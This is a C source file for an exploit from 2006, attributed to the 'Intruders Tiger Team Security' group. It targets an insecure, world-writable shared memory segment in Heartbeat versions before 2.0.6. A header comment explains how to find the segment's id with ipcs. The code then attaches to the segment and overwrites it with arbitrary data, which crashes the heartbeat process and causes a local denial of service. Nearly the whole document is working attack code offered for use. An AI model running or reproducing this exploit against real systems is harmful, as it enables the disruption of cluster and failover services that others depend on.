/* Intruders Tiger Team Security
 * http://www.intruders.org.br/
 *
 * Heartbeat < 2.0.6 Insecure Shared Memory - Local Denial of Service.
 * 
 * Credits: Yan Rong Ge, see link below:
 * http://secunia.com/advisories/21162/
 * Tested on Heartbeat 2.0.5.
 *
 * Thanks for Wendel Guglielmetti, Waldemar Nehgme,
 * Joao Arquimedes, Ricardo BSD and Vitor, Intruders 
 * Tiger Team Security.
 *
 * Usage:
 * [security@mail1 tmp]$ ipcs
 * 
 * ------ Shared Memory Segments --------
 * key        shmid      owner      perms      bytes      nattch     status
 * 0x00000000 1638402    root      666        7296       6          dest
 *
 * ------ Semaphore Arrays --------
 * ....
 * Get shmid of heartbeat(look perms == 666, this is wrong!!!:))
 *
 *  [security@mail1 tmp]$ ./itts_sharedex2 1638402 "Intruders Tiger Team Security.."
 *
 * The heartbeat´s process will droped.
 * Brazil, July/2006.
 */


#include <stdio.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>


int main(int argc, char *argv[]){
int shmid;
char *shm;

if(argc < 2){
printf("Heartbeat Insecure Shared Memory Exploit by Nash Leon\n");
printf("Usage: %s <target_shmid> <trash>\n", argv[0]);
exit(0);
}
shmid = atoi(argv[1]);
if ((shm = shmat(shmid, NULL, 0)) == (char *) -1) {
perror("shmat");
exit(1);
}

strncpy(shm,argv[2],1024);
printf("Check now heartbeat pid or shared memory\n");
printf("Running ps auxww | grep heartbeat or ipcs again.\n\n");
exit(0);
}
